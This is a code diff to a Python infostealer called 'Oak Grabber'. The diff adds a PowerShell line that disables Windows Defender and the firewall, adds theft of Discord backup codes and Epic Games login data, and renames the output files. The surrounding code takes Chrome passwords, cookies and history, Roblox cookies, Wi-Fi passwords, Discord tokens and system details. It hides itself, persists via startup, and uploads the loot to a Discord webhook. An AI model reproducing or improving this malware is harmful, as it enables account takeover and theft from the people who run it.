@@ -1,4 +1,5 @@
 import ctypes, time
+import tempfile
 starttime = time.time()
 
 #config
@@ -6,13 +7,14 @@ webhook = "webhook_here"#change webhook_here to ur webhook
 ping_on_run = True #get pinged when someone runs ur file (True/False)
 add_to_startup = True #adds exe file to startup (True/False)
 HideConsole = True #runs in the background (True/False)
+disable_defender = True #disable windows defender (True/False)
 Selfhide = True #hides the file (True/False)
 fake_error_message = False #displays a fake error message when file ran. (True/False)
 error_message = 'The image file C:\WINDOWS\SYSTEM32\XINPUT1_3.dll is valid, but is for a machine type other than the current machine. Select OK to continue, or CANCEL to fail the DLL load.' #custom message here
 
-if HideConsole is True: ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)#hides console faster
+if HideConsole: ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)#hides console faster
 else:pass
-import os, re, json, psutil, random, platform, requests, base64, subprocess, socket, wmi, sqlite3, ntpath, threading, struct, browser_cookie3, uuid, glob, shutil, sys
+import os, re, json, psutil, random, requests, subprocess, socket, wmi, sqlite3, ntpath, threading, struct, browser_cookie3, uuid, shutil, sys
 from win32crypt import CryptUnprotectData
 from shutil import copy2
 from tkinter import messagebox
@@ -37,7 +39,8 @@ except:
  pass
 def getUser():
     return os.path.split(os.path.expanduser('~'))[-1]
-
+if disable_defender: subprocess.run("powershell Set-MpPreference -DisableRealtimeMonitoring $true && netsh Advfirewall set allprofiles state off", shell=True, capture_output=True)
+else:pass
 def getLocations():
  try:
     if os.name == 'nt':
@@ -141,17 +144,17 @@ def main():
             McToken = "N/A"
         else:
          McToken = account[1]
-    if add_to_startup is True:
+    if add_to_startup:
      try:
         fr =  os.path.basename(sys.argv[0])
         startup =  ntpath.join(roaming, 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
         shutil.copy2(fr, startup)
      except:
          pass
-    if Selfhide is True:
+    if Selfhide:
             ctypes.windll.kernel32.SetFileAttributesW(filename, 2)
     os.chdir(wiseoaktree)
-    if HideConsole is True: ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
+    if HideConsole: ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
     ip, city, country, region, org, loc, googlemap = "None", "None", "None", "None", "None", "None", "None"
     gr = requests.get("https://ipinfo.io/json")
     if gr.status_code == 200:
@@ -202,7 +205,7 @@ def main():
             appdata + '\\Google\\Chrome\\User Data\\Profile 4',
             appdata + '\\Google\\Chrome\\User Data\\Profile 5',
         ]
-    if ping_on_run is True:
+    if ping_on_run:
      message = '@everyone **someone ran ur Oak Grabber**'
     else:
      message = '**someone ran ur Oak Grabber**'
@@ -270,7 +273,7 @@ def main():
     except: mac = 'N/A'
     def cookies():
      try:
-        with open(".\\google-cookies.txt", "w", encoding="utf-8") as f:
+        with open(".\\google cookies.txt", "w", encoding="utf-8") as f:
             f.write("Google Chrome Cookies | Oak grabber by dynasty#3624 | https://github.com/j0taro/Oak-token-Grabber\n\n")
 
         for path in google_paths:
@@ -279,7 +282,7 @@ def main():
                 copy2(path, "Cookievault.db")
                 conn = sqlite3.connect("Cookievault.db")
                 cursor = conn.cursor()
-                with open(".\\google-cookies.txt", "a", encoding="utf-8") as f:
+                with open(".\\google cookies.txt", "a", encoding="utf-8") as f:
                     for result in cursor.execute("SELECT host_key, name, encrypted_value from cookies"):
                         host, name, value = result
                         value = decrypt_password(value,masterkey)
@@ -293,7 +296,7 @@ def main():
         pass
     def passwords():
      try:
-        google_pass = ".\\google-passwords.txt"
+        google_pass = ".\\google passwords.txt"
         with open(google_pass, "w", encoding="utf-8") as f:
             f.write(f"Google Chrome Passwords | Oak grabber by dynasty#3624 | https://github.com/j0taro/Oak-token-Grabber\n\n")
         for path in google_paths:
@@ -316,7 +319,7 @@ def main():
         pass
     def history():
      try:
-        google_history = ".\\google-history.txt"
+        google_history = ".\\google history.txt"
         with open(google_history, "w", encoding="utf-8") as f:
             f.write(f"Google Chrome history | Oak grabber by dynasty#3624 | https://github.com/j0taro/Oak-token-Grabber\n\n")
         for path in google_paths:
@@ -371,7 +374,7 @@ MAC: {mac}
 Coordinates: {loc}
 Processes running
 {ps}'''
-        with open("sysinfo.txt", 'w') as fp:
+        with open("system info.txt", 'w') as fp:
            fp.write(str(tree))
     def robloxcookies():
          try:
@@ -404,7 +407,7 @@ Processes running
           c6 = cookie.split('ROBLOSECURITY=_|')[1].split(' for .roblox.com/>')[0].strip()
          except:
           c6 = ""
-         with open("robloxcookies.txt", "w") as fs:
+         with open("roblox cookies.txt", "w") as fs:
           fs.write(f"Roblox cookies | Oak grabber by dynasty#3624 | https://github.com/j0taro/Oak-token-Grabber\n\n{c}\n{c2}\n{c3}\n{c4}\n{c5}\n{c6}")
     def wifistealer():
      try:
@@ -419,7 +422,7 @@ Processes running
            t = ("{:<30}| {:<}".format(i,results[0]))
         except IndexError:
            t = ("{:<30}| {:<}]".format(i,""))
-        with open("wifistealer.txt",'w') as ws:
+        with open("wifi passwords.txt",'w') as ws:
            ws.write(f"{w}\n{o}\n{t}")
      except:
         pass
@@ -576,7 +579,7 @@ Nitro: {has_nitro}\n"""
                     else:
                         info += (f"""Expires in: None day(s)\n\n""")
 
-                    info += f"""Phone Number: {phone_number if phone_number else ""}
+                    info += f"""Phone Number: {phone_number if phone_number else "N/A"}
 Email: {email if email else ""}\n"""
 
                     if len(billing_info) > 0:
@@ -624,13 +627,34 @@ Email: {email if email else ""}\n"""
                     else:
                      for c, t in val_codes:
                       info += f'\n{t}:\n{c}\n'
+                    path = os.environ["HOMEPATH"]
+                    code = '\\Downloads\\discord_backup_codes.txt'
+                    info+=(f"\n\nDiscord Backup Codes\n\n")
+                    if os.path.exists(path + code):
+                                    with open(path + code, 'r') as g:
+                                        for line in g.readlines():
+                                            if line.startswith("*"):
+                                                info+=(line)
+                    else:
+                                    info+=("No discord backup codes found")
             elif res.status_code == 401:
                     info +=(f"""Invalid token\n""")
                     pass
             
-        with open ("discordinfo.txt","w") as f:
+        with open ("discord info.txt","w") as f:
          f.write(str(info))
 
+    def get_data():
+        epic = appdata + "\\EpicGamesLauncher\\Saved\\Config\\Windows\\GameUserSettings.ini"
+        with open(os.path.join(wiseoaktree, "Epic games data.txt"), 'w', encoding="cp437") as g:
+            g.write(f"Epic Games Offline Data | Oak grabber by dynasty#3624 | https://github.com/j0taro/Oak-token-Grabber\n\n")
+            if os.path.exists(epic):
+                with open(epic, "r") as f:
+                    for line in f.readlines():
+                        if line.startswith("Data="):
+                            g.write(line.split('Data=')[1].strip())
+            else:
+                g.write("No epic games data was found fr")
     def zip():
             os.chdir(temp)
             shutil.make_archive(wiseoaktree, 'zip', wiseoaktree)
@@ -686,10 +710,11 @@ Email: {email if email else ""}\n"""
         os.remove(f'Oak-Logs-{pc_username}.zip')
         shutil.rmtree(wiseoaktree)
     def error():
-     if fake_error_message is True:
+     if fake_error_message:
       messagebox.showerror('Error', error_message)
     wifistealer()
     mc()
+    get_data()
     discordinfo()
     cookies()
     history() #code kinda missed up here fr lmao
